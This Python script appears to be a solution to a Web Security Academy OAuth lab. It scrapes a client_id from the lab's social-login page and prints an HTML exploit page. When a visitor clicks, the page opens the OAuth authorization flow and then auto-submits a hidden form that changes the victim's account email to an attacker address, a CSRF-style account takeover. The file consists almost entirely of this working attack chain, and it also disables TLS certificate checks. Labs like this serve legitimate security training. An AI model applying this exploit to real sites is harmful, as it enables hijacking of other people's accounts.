import http.client
import ssl
import re

LAB_ID = "???"
OAUTH_ID = "???"


def GET_sociallogin() -> http.client.HTTPResponse:
    method, path = 'GET', '/social-login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()

print(GET_sociallogin().read().decode('utf-8'))

client_id = re.findall(r'client_id=([a-zA-Z0-9]+)', GET_sociallogin().read().decode('utf-8'))[0]
oauth_link = f"https://oauth-{OAUTH_ID}.oauth-server.net/auth?" + \
             f"client_id={client_id}&" + \
             f"redirect_uri=https://{LAB_ID}.web-security-academy.net/oauth-callback&" + \
             f"response_type=code&" + \
             f"scope=openid%20profile%20email"

print("Exploit:")
print(f"""
<html>
<body>
<form action="https://{LAB_ID}.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="wiener@evil-user.net" />
</form>
<script>
    window.onclick = () => {{
        window.open('{oauth_link}')
        setTimeout(() => {{
            document.forms[0].submit();
        }}, 5000);
    }}
</script>
</body>
</html>
""")
